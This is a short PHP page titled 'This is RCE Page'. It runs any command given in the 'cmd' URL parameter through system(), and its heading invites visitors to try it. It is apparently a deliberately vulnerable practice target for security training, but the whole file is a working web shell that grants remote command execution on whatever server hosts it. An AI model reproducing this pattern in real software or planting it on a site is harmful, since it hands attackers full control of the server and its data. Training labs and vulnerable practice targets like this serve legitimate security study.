<html>
<h1>This is RCE Page</h1>
<br>
<h3>You can use "cmd" parameter on url <br>Good Luck!</h3>

<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</html>